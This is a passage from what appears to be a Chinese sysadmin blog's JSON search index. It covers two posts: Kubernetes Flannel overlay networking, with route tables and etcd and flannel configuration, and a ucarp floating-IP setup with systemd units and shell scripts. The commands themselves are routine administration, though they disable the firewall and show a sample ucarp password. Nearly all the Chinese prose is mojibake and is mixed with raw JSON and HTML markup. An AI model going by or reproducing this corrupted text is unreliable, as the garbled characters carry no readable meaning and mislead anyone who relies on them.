çš„æƒ…å†µä¸‹è·Ÿæ‰€æœ‰çš„å®¹å™¨(container)äº’ç›¸é€šè®¯ï¼ˆåä¹‹å®¹å™¨è®¿é—®èŠ‚ç‚¹äº¦ç„¶ï¼‰\nå®¹å™¨(container)ä¸­çš„IPåœ°å€ï¼Œåœ¨å®¹å™¨å†…å’Œå®¹å™¨å¤–é¢çœ‹èµ·æ¥æ˜¯ä¸€æ ·çš„\né‚£æ¥åˆ° flannelï¼Œå®ƒæ˜¯ä¸€ç§ Overlay network è¦†ç›–ç½‘ç»œï¼Œç›–åœ¨åŸæœ‰çš„ Node ç½‘ç»œåŸºç¡€ä¸Šï¼š ä¸Šå›¾è¦ä»”ç»†åˆ†æï¼Œ K8S ä¸­å­˜åœ¨ä¸‰ä¸ª+ä¸€ä¸ªç½‘ç»œæ®µï¼š\nnode ç½‘ç»œæ®µï¼Œä¸Šå›¾æ˜¯ 172.20.32.0/19ï¼Œè¿™æ˜¯åŸºç¡€ç½‘ç»œæ®µ pod ç½‘ç»œæ®µï¼Œ100.96.0.0/16ï¼Œ2Â¹â¶(65536)ä¸ªIPï¼Œè¿™æ˜¯ç”± flannel äº§ç”Ÿçš„ overlay networkï¼Œæ‰€æœ‰çš„ pod éƒ½ç«™åœ¨ä¸€ä¸ªå¤§å¹¿åœºä¸Šï¼Œäº’ç›¸å¯è§ svc ç½‘ç»œæ®µï¼Œä¸Šå›¾æœªæï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“ï¼Œæƒ³è¦æŠŠ pod çš„ ip ç»™å›ºå®šä¸‹æ¥ï¼Œå°±å¾—ä½¿ç”¨ svc æ¥åˆ†é…å›ºå®šçš„åŸŸåï¼Œè¿™ä¸ªæ˜¯ç”± iptables æ¥ç»´æŠ¤çš„ In-Host docker networkç½‘ç»œæ®µï¼Œè¿™æ˜¯æ¯ä¸ª Node ä¸»æœºçš„å•ç‹¬ç½‘ç»œæ®µï¼Œflannelç»™æ¯ä¸ª Node ä¸»æœºåˆ’åˆ†äº†ä¸€ä¸ª 100.96.x.0/24 æ®µï¼Œç„¶ååœ¨ etcd å†…è¿›è¡Œç»´æŠ¤ï¼Œæ¥é¿å…ä¸åŒçš„ Node ä¸»æœºåˆ†é…IPå†²çªã€‚ ç»¼è¿°ï¼šflannel ä¸ºæ¯ä¸ª Node åˆ†é…ä¸€ä¸ª subnetï¼Œå®¹å™¨(container)ä»æ­¤ subnet ä¸­åˆ†é… IPï¼Œè¿™äº› IP å¯ä»¥åœ¨ Node é—´è·¯ç”±ï¼Œå®¹å™¨é—´æ— éœ€ NAT å’Œ port mapping å°±å¯ä»¥è·¨ä¸»æœºé€šä¿¡ã€‚\næ¯ä¸ª subnet éƒ½æ˜¯ä»ä¸€ä¸ªæ›´å¤§çš„ IP æ± ä¸­åˆ’åˆ†çš„ï¼Œflannel ä¼šåœ¨æ¯ä¸ª Node ä¸Šè¿è¡Œä¸€ä¸ªå« flanneld çš„ agentï¼Œå…¶èŒè´£å°±æ˜¯ä»æ± å­ä¸­åˆ†é… subnetã€‚ä¸ºäº†åœ¨å„ä¸ªä¸»æœºé—´å…±äº«ä¿¡æ¯ï¼Œflannel ç”¨ etcdï¼ˆä¸ consul ç±»ä¼¼çš„ key-value åˆ†å¸ƒå¼æ•°æ®åº“ï¼‰å­˜æ”¾ç½‘ç»œé…ç½®ã€å·²åˆ†é…çš„ subnetã€host çš„ IP ç­‰ä¿¡æ¯ã€‚\næ•°æ®åŒ…å¦‚ä½•åœ¨ä¸»æœºé—´è½¬å‘æ˜¯ç”± backend å®ç°çš„ã€‚flannel æä¾›äº†å¤šç§ backendï¼Œæœ€å¸¸ç”¨çš„æœ‰ vxlan å’Œ host-gwï¼Œudp ä¸‡ä¸‡ä¸å¯ä½¿ç”¨ã€‚\nä»”ç»†åˆ†æä¸€ä¸‹ä¸¤ä¸ªä¸åŒä¸»æœºä¸Šçš„containerè·¨ä¸»æœºäº’ç›¸é€šè®¯çš„è¿‡ç¨‹ï¼š\ncontainer-1 é¦–å…ˆå»ºç«‹ IP åŒ…ï¼Œ src: 100.96.1.2 -\u0026gt; dst: 100.96.2.3, åŒ…å‘åˆ° docker0 ç½‘æ¡¥ï¼Œdocker0 æ˜¯ container-1 çš„ç¼ºçœ gateway ç½‘å…³ã€‚\nåœ¨æ¯ä¸ª Node ä¸Šï¼Œflannel éƒ½ä¼šè·‘ä¸€ä¸ªflanneldçš„å®ˆæŠ¤è¿›ç¨‹ï¼Œå®ƒä¼šåœ¨ Linux çš„ kernel è·¯ç”±è¡¨ä¸­å»ºç«‹è‹¥å¹²æ¡è·¯ç”±ï¼Œ Node1 çš„è·¯ç”±è¡¨å¦‚ä¸‹:\nadmin@ip-172-20-33-102:~$ ip route default via 172.20.32.1 dev eth0 100.96.0.0/16 dev flannel0 proto kernel scope link src 100.96.1.0 100.96.1.0/24 dev docker0 proto kernel scope link src 100.96.1.1 172.20.32.0/19 dev eth0 proto kernel scope link src 172.20.33.102 å¯¹ç…§è·¯ç”±è¡¨ï¼Œdst 100.96.2.3 çš„è·¯ç”±ä¼šè½åˆ° 100.96.0.0/16 è¿™ä¸€æ¡ä¸Šï¼Œä¹Ÿå°±æ˜¯è¯´ä¼šè½åˆ° flannel0 è¿™ä¸ªè®¾å¤‡ä¸Šç»§ç»­è½¬å‘å‡ºå»ã€‚\nflannel0 å‘¢æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªç”±flanneld è¿›ç¨‹å»ºç«‹çš„ TUN è™šæ‹Ÿç½‘å¡è®¾å¤‡ï¼š\nå†™TUNï¼šå½“ IP åŒ…å†™åˆ°flannel0åï¼Œä¼šè½¬å‘åˆ° kernelï¼Œç„¶å kernel æŸ¥è·¯ç”±è¡¨å†è½¬å‘ è¯»TUNï¼šå½“ IP åŒ…é¦–å…ˆåˆ°è¾¾æ ¸å¿ƒï¼Œè·¯ç”±è¡¨æ˜¾ç¤ºä¸‹ä¸€è·³æ˜¯flannel0è™šæ‹Ÿç½‘å¡ï¼Œkernelä¼šç›´æ¥æŠŠåŒ…å‘åˆ°äº§ç”Ÿè¿™ä¸ªè™šæ‹Ÿç½‘å¡çš„è¿›ç¨‹å»ï¼Œä¹Ÿå°±æ˜¯flanneldè¿›è¡Œè¯»åŒ… çœ‹ä¸Šå›¾ï¼ŒIP åŒ…é¦–å…ˆåˆ°è¾¾ Docker0ï¼Œå› ä¸ºå®ƒæ˜¯ç½‘å…³ï¼Œç„¶åæŸ¥å†…æ ¸è·¯ç”±è¡¨ï¼Œåˆ°è¾¾flannel0è™šæ‹Ÿç½‘å¡ï¼Œç„¶åå°±åˆ°è¾¾flanneldè¿›ç¨‹è¯»åŒ…ï¼Œ è¿™æ—¶å€™flanneldä¼šåšä»€ä¹ˆå‘¢ï¼Ÿ\nflanneldä» etcd ä¸­è·å¾—å„ä¸ªä¸»æœºç½‘æ®µå¯¹åº”çš„èŠ‚ç‚¹ä¿¡æ¯ï¼š\nadmin@ip-172-20-33-102:~$ etcdctl ls /coreos.com/network/subnets /coreos.com/network/subnets/100.96.1.0-24 /coreos.com/network/subnets/100.96.2.0-24 /coreos.com/network/subnets/100.96.3.0-24 admin@ip-172-20-33-102:~$ etcdctl get /coreos.com/network/subnets/100.96.2.0-24 {\u0026#34;PublicIP\u0026#34;:\u0026#34;172.20.54.98\u0026#34;} äºæ˜¯ä¹ Node1 ä¸Šé¢çš„ flanneld è¿›ç¨‹å¾—çŸ¥ 100.96.2.3 IPå¯¹åº”çš„ç½‘æ®µæ˜¯ 100.96.2.0/24 ï¼Œå†è¿›ä¸€æ­¥å¯¹åº”åˆ° Node2 çš„å…¬ç½‘IP 172.20.54.98ï¼Œç„¶åå®ƒå°±ä¼šç»§ç»­å°è£…è¿™ä¸ªIPåŒ…ï¼Œç”¨UDPæˆ–è€…VXLANï¼ŒæŠŠè¿™ä¸ª IP åŒ…å†åŒ…è£¹ä¸€å±‚å°èµ·æ¥é€åˆ° Node2 çš„ flanneld è¿›ç¨‹å»ã€‚\nNode2ï¼šåŒ…é¦–å…ˆä»ç½‘å¡åˆ°è¾¾ Node2 çš„æ ¸å¿ƒ kernelï¼Œè·¯ç”±è¡¨æ˜¾ç¤ºä¸‹ä¸€è·³æ˜¯flannel0 è™šæ‹Ÿç½‘å¡ï¼ŒåŒ…å°±è½¬å‘åˆ° flanneld è¿›ç¨‹è¯»åŒ…ï¼Œflanneldæ¥æ”¶åˆ°åŒ…åï¼Œå°±ä¼šåšæ‹†åŒ…ï¼Œæ‹†å®ŒåŒ…ç›´æ¥å†™åŒ…åˆ° TUNï¼Œç„¶ååŒ…åˆ°è¾¾æœ¬åœ°æ ¸å¿ƒè·¯ç”±ï¼Œå†æŸ¥è·¯ç”±è¡¨è½¬å‘åˆ°docker0ï¼Œæœ€ç»ˆåˆ°è¾¾ container-2\næˆ‘ä»¬åŒæ ·å¯ä»¥æŸ¥çœ‹ Node2 çš„è·¯ç”±è¡¨ï¼Œåº”è¯¥æ˜¾ç¤ºå¦‚ä¸‹ç»“æœï¼š\nadmin@ip-172-20-54-98:~$ ip route default via 172.20.32.1 dev eth0 100.96.0.0/16 dev flannel0 proto kernel scope link src 100.96.2.0 100.96.2.0/24 dev docker0 proto kernel scope link src 100.96.2.1 172.20.32.0/19 dev eth0 proto kernel scope link src 172.20.54.98 è¿™æ ·æ•´ä¸ªè¿‡ç¨‹å°±æ˜æ™°äº†ã€‚\né“ç†æ˜æ™°äº†ï¼Œä¸‹é¢æˆ‘ä»¬å°±éœ€è¦æ¥å®é™…æ“ä½œäº†ã€‚\näºŒã€å®æˆ˜ ç›´æ¥åœ¨ k8s é‡Œè£…å°±å¾ˆç®€å•ï¼Œç”¨ yaml ä¸€æ­¥æ“ä½œå°±è¡Œäº†ï¼Œè¿™é‡Œæˆ‘ä»¬ä¸åšä»»ä½•ä»‹ç»ã€‚\næˆ‘ä»¬ä¸‹é¢è¯´çš„æ˜¯å¦‚ä½•å•ç‹¬æŠŠ flannel å•ç‹¬æ‹¿å‡ºæ¥ä½¿ç”¨ï¼š\n1ã€é¦–å…ˆè¦è£…etcd å‚ç…§ä¹‹å‰çš„å¸–å­ï¼šEtcdå•èŠ‚ç‚¹åº”ç”¨\nè¿™é‡Œä¹Ÿç»™å‡ºä¸ç”¨Dockerï¼Œç”¨systemctlæ¥è¿è¡Œçš„æ–¹æ¡ˆï¼š\nå‡†å¤‡å·¥ä½œï¼Œå…³é—­selinuxï¼Œæ‰“å¼€åŒ…è½¬å‘ï¼š\necho 1 \u0026gt; /proc/sys/net/ipv4/ip_forward #æˆ–è€…ä¿®æ”¹/etc/sysctl.confï¼Œç„¶åsysctl -p #net.ipv4.ip_forward = 1 systemctl disable firewalld.service systemctl stop firewalld.service iptables -P FORWARD ACCEPT å®‰è£… etcd ï¼š\nyum install etcd -y cp /etc/etcd/etcd.conf/etc/etcd/etcd.conf.bak vi /etc/etcd/etcd.conf ETCD_LISTEN_PEER_URLS=\u0026#34;http://172.16.9.110:2380\u0026#34; ETCD_LISTEN_CLIENT_URLS=http://172.16.9.110:2379,http://127.0.0.1:2379 ETCD_NAME=\u0026#34;default\u0026#34; ETCD_INITIAL_ADVERTISE_PEER_URLS=\u0026#34;http://172.16.9.110:2380\u0026#34; ETCD_ADVERTISE_CLIENT_URLS=http://172.16.9.110:2379 systemctl enable --now etcd é…ç½® etcdï¼š\nvi /root/etcd.sh { \u0026#34;Network\u0026#34;: \u0026#34;10.10.0.0/16\u0026#34;,\u0026#34;SubnetLen\u0026#34;: 24,\u0026#34;Backend\u0026#34;: {\u0026#34;Type\u0026#34;:\u0026#34;vxlan\u0026#34;} } etcdctl --endpoints=http://172.16.9.110:2379 set kubernetesâ€‘cluster/network/config \u0026lt; /root/etcd.sh etcdctl ls kubernetesâ€‘cluster/network/config curl -s http://172.16.9.110:2379/v2/keys/kubernetesâ€‘cluster/network/subnets è§£é‡Šä¸€ä¸‹ï¼špod çš„ç½‘æ®µæ˜¯ 10.10.0.0/16ï¼Œæ©ç æ˜¯ /16 ï¼Œæœ¬åœ° Node ä¸»æœºçš„æ©ç æ˜¯/24ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸€å°å®¿ä¸»æœºä¸Šæœ€å¤šäº§256å°containerã€‚\nç„¶å etcd çš„ key æ˜¯ kubernetesâ€‘cluster/network\n2ã€ç„¶åè£… flannelï¼š æ³¨æ„ etcd çš„é…ç½®è·Ÿä¸Šé¢ä¸€è‡´ï¼š\nyum install flannel -y cp /etc/sysconfig/flanneld/etc/sysconfig/flanneld.bak vi/etc/sysconfig/flanneld FLANNEL_ETCD_ENDPOINTS=http://172.16.9.110:2379 FLANNEL_ETCD_PREFIX=\u0026#34;kubernetesâ€‘cluster/network\u0026#34; systemctl enable --now flanneld 3ã€é‡å¯Docker ç¼–è¾‘dockerå¯åŠ¨é…ç½®æ–‡ä»¶ï¼š\ncat /run/flannel/subnet.env FLANNEL_NETWORK=10.10.0.0/16 FLANNEL_SUBNET=10.10.1.1/24 FLANNEL_MTU=1450 FLANNEL_IPMASQ=false /usr/lib/systemd/system/docker.service # Add: --bip= and --mtu= vi /usr/lib/systemd/system/docker.service dockerd --bip=$FLANNEL_SUBNET --mtu=$FLANNEL_MTU æˆ–è€… cat /run/flannel/docker DOCKER_OPT_BIP=\u0026#34;â€‘â€‘bip=10.10.1.1/24\u0026#34; DOCKER_OPT_IPMASQ=\u0026#34;â€‘â€‘ipâ€‘masq=true\u0026#34; DOCKER_OPT_MTU=\u0026#34;â€‘â€‘mtu=1450\u0026#34; DOCKER_NETWORK_OPTIONS=\u0026#34; â€‘â€‘bip=10.10.1.1/24 â€‘â€‘ipâ€‘masq=false â€‘â€‘mtu=1450 \u0026#34; cat /etc/systemd/system/docker.service.d/docker.conf ServiceEnvironmentFile=â€‘/etc/sysconfig/docker EnvironmentFile=â€‘/etc/sysconfig/dockerâ€‘storage EnvironmentFile=â€‘/etc/sysconfig/dockerâ€‘network EnvironmentFile=â€‘/run/flannel/docker ExecStart= ExecStart=/usr/bin/dockerd $OPTIONS $DOCKER_STORAGE_OPTIONS $DOCKER_NETWORK_OPTIONS $BLOCK_REGISTRY $INSECURE_REGISTRY ç„¶åå°±å¯ä»¥äº†ã€‚\né‚£ä¹ˆä¸ºä»€ä¹ˆ flannel ä¸ç”¨ UDP å‘¢ï¼Ÿ\nçœ‹ä¸Šå›¾ï¼ŒåŒ…ä»ç”¨æˆ·ç©ºé—´åˆ°å†…æ ¸ç©ºé—´çš„æµå…¥æµå‡ºï¼Œä¼šç»è¿‡1ã€2ã€3çš„æ¥å›æ‹·è´ç¿»è½¬ï¼Œæ€§èƒ½æŸå¤±è¾ƒå¤§ï¼Œæ‰€ä»¥ UDP åªèƒ½ç”¨åœ¨æµ‹è¯•ç¯å¢ƒã€‚\næœ€å flannel çš„ VXLAN å’Œ HOST-GW åˆæœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼Ÿ\nä¸ vxlan ä¸åŒï¼Œhost-gw ä¸ä¼šå°è£…æ•°æ®åŒ…ï¼Œè€Œæ˜¯åœ¨ä¸»æœºçš„è·¯ç”±è¡¨ä¸­åˆ›å»ºåˆ°å…¶ä»–ä¸»æœº subnet çš„è·¯ç”±æ¡ç›®ï¼Œä»è€Œå®ç°å®¹å™¨è·¨ä¸»æœºé€šä¿¡ host-gw æŠŠæ¯ä¸ªä¸»æœºéƒ½é…ç½®æˆç½‘å…³ï¼Œä¸»æœºçŸ¥é“å…¶ä»–ä¸»æœºçš„ subnet å’Œè½¬å‘åœ°å€ã€‚ vxlan åˆ™åœ¨ä¸»æœºé—´å»ºç«‹éš§é“ï¼Œä¸åŒä¸»æœºçš„å®¹å™¨éƒ½åœ¨ä¸€ä¸ªå¤§çš„ç½‘æ®µå†…ï¼ˆæ¯”å¦‚ 10.2.0.0/16ï¼‰ã€‚ è™½ç„¶ vxlan ä¸ host-gw ä½¿ç”¨ä¸åŒçš„æœºåˆ¶å»ºç«‹ä¸»æœºä¹‹é—´è¿æ¥ï¼Œä½†å¯¹äºå®¹å™¨åˆ™æ— éœ€ä»»ä½•æ”¹å˜ã€‚ ç”±äº vxlan éœ€è¦å¯¹æ•°æ®è¿›è¡Œé¢å¤–æ‰“åŒ…å’Œæ‹†åŒ…ï¼Œæ€§èƒ½ä¼šç¨é€Šäº host-gwã€‚ ","permalink":"https://rendoumi.com/posts/20220317-kubernetes_flannel/","summary":"\u003cp\u003eç°åœ¨å„å¤§å…¬æœ‰äº‘çš„ k8s ç½‘ç»œæ’ä»¶åŸºæœ¬ç”¨çš„éƒ½æ˜¯ vxlanï¼Œæˆ‘ä»¬ä¹Ÿéœ€è¦å¯¹è¿™ä¸ªè¿›è¡Œä¸€ä¸‹è¯¦ç»†äº†è§£ï¼Œä»¥ä¾¿ç”¨äºå…¬å¸çš„æ­£å¼ç”Ÿäº§ç¯å¢ƒã€‚\u003c/p\u003e\n\u003ch2 id=\"ä¸€åŸç†\"\u003eä¸€ã€åŸç†\u003c/h2\u003e\n\u003cp\u003eé¦–å…ˆï¼Œkubernetesçš„ç½‘ç»œæ¨¡å‹ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20220317101247744\" loading=\"lazy\" src=\"/posts/20220317-kubernetes_flannel/image-20220317101247744.png\"\u003e\u003c/p\u003e\n\u003cp\u003eåŒ…å«ä¸‰è¦ç´ ï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eæ‰€æœ‰çš„å®¹å™¨(container)ä¹‹é—´èƒ½å¤Ÿåœ¨ä¸ä½¿ç”¨ NAT çš„æƒ…å†µä¸‹äº’ç›¸é€šè®¯\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eæ‰€æœ‰çš„èŠ‚ç‚¹(Node)èƒ½å¤Ÿåœ¨ä¸ä½¿ç”¨ NAT çš„æƒ…å†µä¸‹è·Ÿæ‰€æœ‰çš„å®¹å™¨(container)äº’ç›¸é€šè®¯ï¼ˆåä¹‹å®¹å™¨è®¿é—®èŠ‚ç‚¹äº¦ç„¶ï¼‰\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eå®¹å™¨(container)ä¸­çš„IPåœ°å€ï¼Œåœ¨å®¹å™¨å†…å’Œå®¹å™¨å¤–é¢çœ‹èµ·æ¥æ˜¯ä¸€æ ·çš„\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eé‚£æ¥åˆ° flannelï¼Œå®ƒæ˜¯ä¸€ç§ Overlay network è¦†ç›–ç½‘ç»œï¼Œç›–åœ¨åŸæœ‰çš„ Node ç½‘ç»œåŸºç¡€ä¸Šï¼š\n\u003cimg alt=\"image-20220317101802355\" loading=\"lazy\" src=\"/posts/20220317-kubernetes_flannel/image-20220317101802355.png\"\u003e\u003c/p\u003e\n\u003cp\u003eä¸Šå›¾è¦ä»”ç»†åˆ†æï¼Œ K8S ä¸­å­˜åœ¨ä¸‰ä¸ª+ä¸€ä¸ªç½‘ç»œæ®µï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003enode ç½‘ç»œæ®µï¼Œä¸Šå›¾æ˜¯ 172.20.32.0/19ï¼Œè¿™æ˜¯åŸºç¡€ç½‘ç»œæ®µ\u003c/li\u003e\n\u003cli\u003epod ç½‘ç»œæ®µï¼Œ100.96.0.0/16ï¼Œ2Â¹â¶(65536)ä¸ªIPï¼Œè¿™æ˜¯ç”± flannel äº§ç”Ÿçš„ overlay networkï¼Œæ‰€æœ‰çš„ pod éƒ½ç«™åœ¨ä¸€ä¸ªå¤§å¹¿åœºä¸Šï¼Œäº’ç›¸å¯è§\u003c/li\u003e\n\u003cli\u003esvc ç½‘ç»œæ®µï¼Œä¸Šå›¾æœªæï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“ï¼Œæƒ³è¦æŠŠ pod çš„ ip ç»™å›ºå®šä¸‹æ¥ï¼Œå°±å¾—ä½¿ç”¨ svc æ¥åˆ†é…å›ºå®šçš„åŸŸåï¼Œè¿™ä¸ªæ˜¯ç”± iptables æ¥ç»´æŠ¤çš„\u003c/li\u003e\n\u003cli\u003eIn-Host docker networkç½‘ç»œæ®µï¼Œè¿™æ˜¯æ¯ä¸ª Node ä¸»æœºçš„å•ç‹¬ç½‘ç»œæ®µï¼Œflannelç»™æ¯ä¸ª Node ä¸»æœºåˆ’åˆ†äº†ä¸€ä¸ª 100.96.x.0/24 æ®µï¼Œç„¶ååœ¨ etcd å†…è¿›è¡Œç»´æŠ¤ï¼Œæ¥é¿å…ä¸åŒçš„ Node ä¸»æœºåˆ†é…IPå†²çªã€‚\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eç»¼è¿°ï¼šflannel ä¸ºæ¯ä¸ª Node åˆ†é…ä¸€ä¸ª subnetï¼Œå®¹å™¨(container)ä»æ­¤ subnet ä¸­åˆ†é… IPï¼Œè¿™äº› IP å¯ä»¥åœ¨ Node é—´è·¯ç”±ï¼Œå®¹å™¨é—´æ— éœ€ NAT å’Œ port mapping å°±å¯ä»¥è·¨ä¸»æœºé€šä¿¡ã€‚\u003c/p\u003e","title":"Kubernetesä¸‹Flannelç½‘ç»œ"},{"content":"æœ‰ V2EX çš„å›å‹é—®åˆ°å¦‚ä½•é™æ€ç¼–è¯‘ keepalived çš„é—®é¢˜ï¼Œå®é™…ä¸Š keepalived ç¡®å®é…ç½®æ¯”è¾ƒéº»çƒ¦ã€‚é‚£è¿˜æœ‰ä¸€ä¸ªç®€å•æ˜“è¡Œçš„ ucarpï¼Œç”Ÿäº§ä¹Ÿå¯ä»¥ç”¨è¿™ä¸ªã€‚\nucarp è·Ÿ keepalived ä¸€æ ·ï¼Œéƒ½æ˜¯ç”¨äºé«˜å¯ç”¨çš„ IP æ¼‚ç§»\nä½†æ˜¯æ¯” keepalived é…ç½®ç®€å•ï¼Œè€Œä¸” opnsense å°±æ˜¯ç”¨çš„è¿™ä¸ªåšçš„é«˜å¯ç”¨ï¼Œopnsense æ˜¯ä¸ªéå¸¸å¯é çš„é˜²ç«å¢™è½¯ä»¶ã€‚\né¦–å…ˆæœ‰ä¸¤å°è™šæœºï¼Œ172.18.19.1å’Œ172.18.19.2ï¼Œè™šæ‹Ÿipæ˜¯172.18.19.3\nå…ˆé…ç½®172.18.19.1\nyum install epel-release yum install psmisc yum install ucarp cat\u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /etc/systemd/system/ucarp.service [Unit] Description=UCARP virtual interface After=network.target [Service] Type=simple ExecStart=/usr/local/bin/ucarp.sh RemainAfterExit=true ExecStop=/usr/bin/killall -SIGTERM ucarp ExecStop=/bin/sleep 10 TimeoutStopSec=30 StandardOutput=journal [Install] WantedBy=multi-user.target EOF æ³¨æ„ï¼Œä¸Šé¢æˆ‘ä»¬çš„systemdæ˜¯ç›´æ¥è°ƒç”¨äº†ucarp.shæ¥å¯åŠ¨ï¼Œè¿™æ ·æ›´ç®€å•ã€‚ ä¸‰ä¸ªè„šæœ¬ï¼Œæ³¨æ„æƒé™æ˜¯755 cat\u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /usr/local/bin/ucarp.sh #!/bin/bash\u0026#39; /usr/sbin/ucarp -i eth0 -B -p nb1Dshiwode -v 001 -a 172.18.19.3 -s 172.18.19.1 --shutdown --preempt -u /usr/local/bin/vip-up.sh -d /usr/local/bin/vip-down.sh EOF cat\u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /usr/local/bin/vip-up.sh #!/bin/sh /sbin/ip addr add ${2}/24 dev ${1} /sbin/ip neigh flush dev ${1} EOF cat\u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /usr/local/bin/vip-down.sh #!/bin/sh /sbin/ip addr del ${2}/24 dev ${1} /usr/sbin/arp -d ${2} EOF chmod 755 /usr/local/bin/ucarp.sh /usr/local/bin/vip-up.sh /usr/local/bin/vip-down.sh okï¼Œç¬¬ä¸€å°æœºå™¨å°±é…ç½®å¥½äº†\næ‰€æœ‰çš„ä¸œè¥¿éƒ½åœ¨ucarp.shçš„é‚£ä¸€è¡Œçš„å‚æ•°ä¸Šï¼Œç›´æ¥ç”¨ucarp -hæ¥æŸ¥çœ‹\né…ç½®ç¬¬äºŒå°172.18.19.2ï¼Œå…¶ä»–çš„ä¸œè¥¿éƒ½ä¸€æ ·ï¼Œå”¯ä¸€ä¸åŒçš„å°±æ˜¯ucapr.shçš„ä¸€å¤„ä¸ä¸€æ ·\ncat\u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /usr/local/bin/ucarp.sh #!/bin/bash\u0026#39; /usr/sbin/ucarp -i eth0 -B -p nb1Dshiwode -v 001 -a 172.18.19.3 -s 172.18.19.2 --shutdown --preempt -u /usr/local/bin/vip-up.sh -d /usr/local/bin/vip-down.sh EOF # -s 172.18.19.2 æºipå’Œ19.1ä¸åŒ okï¼Œä¸¤å°éƒ½é…ç½®å®Œæ¯•, åˆ†åˆ«æ‰§è¡Œå¯åŠ¨\nsystemctl daemon-reload systemctl enable --now ucarp å¯ä»¥å†æ‰¾ä¸€å°æœºå™¨ï¼Œä¸€ç›´é•¿ ping 172.18.19.3ï¼Œç„¶åéšæœºæ€æ‰ 19.1 å’Œ 19.2 ä¸Šé¢çš„ ucarp è¿›ç¨‹ï¼Œå¯ä»¥çœ‹åˆ° vip 172.18.19.3 ä¼šæ¥å›é£˜\næ³¨æ„ï¼šå¦‚æœä¸»æ‰äº†ï¼Œä»æ¥ç®¡äº† vip å˜æˆ masterï¼Œé‚£ä¹ˆä¸»å†èµ·æ¥çš„æ—¶å€™ä¸ä¼šå»æŠ¢ä»çš„ masterã€‚\n","permalink":"https://rendoumi.com/posts/20220225-ucarp/","summary":"\u003cp\u003eæœ‰ V2EX çš„å›å‹é—®åˆ°å¦‚ä½•é™æ€ç¼–è¯‘ keepalived çš„é—®é¢˜ï¼Œå®é™…ä¸Š keepalived ç¡®å®é…ç½®æ¯”è¾ƒéº»çƒ¦ã€‚é‚£è¿˜æœ‰ä¸€ä¸ªç®€å•æ˜“è¡Œçš„ ucarpï¼Œç”Ÿäº§ä¹Ÿå¯ä»¥ç”¨è¿™ä¸ªã€‚\u003c/p\u003e\n\u003cp\u003eucarp è·Ÿ keepalived ä¸€æ ·ï¼Œéƒ½æ˜¯ç”¨äºé«˜å¯ç”¨çš„ IP æ¼‚ç§»\u003c/p\u003e\n\u003cp\u003eä½†æ˜¯æ¯” keepalived é…ç½®ç®€å•ï¼Œè€Œä¸” opnsense å°±æ˜¯ç”¨çš„è¿™ä¸ªåšçš„é«˜å¯ç”¨ï¼Œopnsense æ˜¯ä¸ªéå¸¸å¯é çš„é˜²ç«å¢™è½¯ä»¶ã€‚\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆæœ‰ä¸¤å°è™šæœºï¼Œ172.18.19.1å’Œ172.18.19.2ï¼Œè™šæ‹Ÿipæ˜¯172.18.19.3\u003c/p\u003e\n\u003cp\u003eå…ˆé…ç½®172.18.19.1\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install epel-release\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install psmisc\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install ucarp\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat\u003cspan class=\"s\"\u003e\u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /etc/systemd/system/ucarp.service\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e[Unit]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eDescription=UCARP virtual interface\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eAfter=network.target\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e[Service]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eType=simple\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eExecStart=/usr/local/bin/ucarp.sh\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eRemainAfterExit=true\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eExecStop=/usr/bin/killall -SIGTERM ucarp\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan 